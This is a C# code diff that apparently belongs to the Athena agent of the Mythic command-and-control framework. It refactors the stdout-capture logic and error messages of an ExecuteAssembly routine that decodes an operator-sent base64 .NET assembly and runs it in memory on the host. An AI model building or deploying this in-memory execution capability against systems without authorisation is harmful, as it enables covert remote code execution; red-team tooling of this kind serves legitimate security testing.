@@ -24,9 +24,6 @@ namespace Athena.Commands
         private AssemblyLoadContext commandContext { get; set; }
         private ExecuteAssemblyContext executeAssemblyContext { get; set; }
         private ConcurrentDictionary<string, IPlugin> loadedPlugins { get; set; }
-        //public bool assemblyIsRunning { get; set; }
-        //public string assemblyTaskId { get; set; }
-        //private StringWriter executeAssemblyWriter { get; set; }
         public AssemblyHandler()
         {
             this.commandContext = new AssemblyLoadContext("athcmd");
@@ -118,16 +115,13 @@ namespace Athena.Commands
         /// <param name="job">MythicJob containing the assembly with arguments</param>
         public async Task<string> ExecuteAssembly(MythicJob job) //How do I deal with this now?
         {
-            //Backup the original StdOut
-            //var origStdOut = Console.Out;
-
-            //This might be able to be replaced with the functionality in PluginHandler
+            //Check if we can capture StdOut
             if (PluginHandler.StdIsBusy())
             {
                 return new ResponseResult()
                 {
                     completed = "true",
-                    user_output = "An assembly is already executing.!",
+                    user_output = "Std.Out is busy with another command!",
                     task_id = job.task.id,
                 }.ToJson();
             }
@@ -138,28 +132,28 @@ namespace Athena.Commands
             try
             {
                 StringWriter sw = new StringWriter();
-                if (PluginHandler.CaptureStdOut(job.task.id))
-                {
-                    //Load the assembly
-                    var assembly = this.executeAssemblyContext.LoadFromStream(new MemoryStream(await Misc.Base64DecodeToByteArrayAsync(ea.asm)));
 
-                    //Invoke the Assembly
-                    assembly.EntryPoint.Invoke(null, new object[] { await Misc.SplitCommandLine(ea.arguments) }); //I believe this blocks until it's finished
-                    
-                    //Return StdOut back to original location
-                    PluginHandler.ReleaseStdOut();
-
-                    return await this.GetAssemblyOutput();
-                }
-                else
+                if (!PluginHandler.CaptureStdOut(job.task.id))
                 {
                     return new ResponseResult()
                     {
                         completed = "true",
-                        user_output = "An assembly is already executing!",
+                        user_output = "Couldn't get a handle on Std.Out!",
                         task_id = job.task.id,
                     }.ToJson();
                 }
+                
+                //Load the assembly
+                var assembly = this.executeAssemblyContext.LoadFromStream(new MemoryStream(await Misc.Base64DecodeToByteArrayAsync(ea.asm)));
+
+                //Invoke the Assembly
+                assembly.EntryPoint.Invoke(null, new object[] { await Misc.SplitCommandLine(ea.arguments) }); //I believe this blocks until it's finished
+                    
+                //Return StdOut back to original location
+                PluginHandler.ReleaseStdOut();
+
+                return await this.GetAssemblyOutput();
+
             }
             catch (Exception e)
             {
@@ -263,6 +257,7 @@ namespace Athena.Commands
                                     }
                                 }
                         }.ToJson();
+
                     }
                 }
 
